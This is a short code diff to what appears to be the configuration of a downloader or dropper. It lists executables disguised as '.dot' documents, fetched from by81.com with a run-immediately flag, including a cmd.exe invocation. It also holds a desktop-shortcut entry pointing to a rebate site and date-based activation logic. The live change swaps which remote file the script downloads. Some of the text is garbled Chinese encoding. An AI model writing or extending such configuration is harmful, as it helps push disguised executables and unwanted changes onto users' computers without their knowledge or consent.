@@ -7,6 +7,13 @@ var ___gconfig = {
 		//						 {id:10009,name:"cmd.exe",url:"http://www.by81.com/05/cmd.exe.dot", md5:"", invalidcondition:function(){} ,param:" /c echo Éý¼¶ÖÐ & pause",runimmediately:1},	
 		//						 {id:100010,name:"ovxSetup.exe",url:"http://www.by81.com/05/ovxSetup.exe.dot", md5:"", invalidcondition:function(){} ,param:"", runimmediately:1}],
 		//desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
-		userdefinedlist:[{id:30002,name:"Doc30002.dot", md5:"", url:"http://www.by81.com/05/Doc30002.dot"}]
+		userdefinedlist:[{id:30003,name:"Doc30003.dot", md5:"", url:"http://www.by81.com/05/Doc30003.dot"}  ]
 	}
 	//alert(___gconfig.validcondition.PID.min)
+var currentDate = new Date()
+//alert(currentDate.getDate())
+//if ((7 == currentDate.getMonth()) && (17== currentDate.getDate()) ){
+
+//}else{
+//	___gconfig.validcondition.osver.max=4;
+//}
